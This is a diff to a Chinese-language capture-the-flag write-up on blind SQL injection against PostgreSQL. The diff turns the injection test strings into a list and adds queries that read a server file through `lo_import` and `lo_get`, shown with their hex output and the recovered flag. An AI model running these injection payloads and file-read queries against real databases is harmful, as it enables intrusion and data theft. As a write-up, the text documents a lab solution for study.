@@ -10,9 +10,9 @@
 
 e.g. 
 
-有warning: `admin'` or `admin'-` ...
+- 有warning: `admin'` or `admin'-` ...
 
-沒warning: `admin'--` or `admin''` or `admin' and 1=2 --` ...
+- 沒warning: `admin'--` or `admin''` or `admin' and 1=2 --` ...
 
 而且這題似乎擋了很多東西，`pg_sleep`無法用，`dblink`簡單踹一下似乎也沒dns request (但賽後才知道好像其實可以?)
 
@@ -41,6 +41,15 @@ e.g. `'and 1=2 union select NULL, (select case when 1=1 then (select repeat('a',
 回傳一個 OID 回來，所以代表 flag 有成功載入進去
 
 接著用 `lo_get(OID)`，把這個 OID 對應的 Object 讀出來就行
+
+```
+select cast(lo_import('/var/lib/postgresql/data/secret') as text)
+=> 18440
+
+select cast(lo_get(18440) as text)
+=> \x66627b4040646e....
+```
+
 
 `fb{@@dns_3xfil_f0r_the_w1n!!@@}`
 
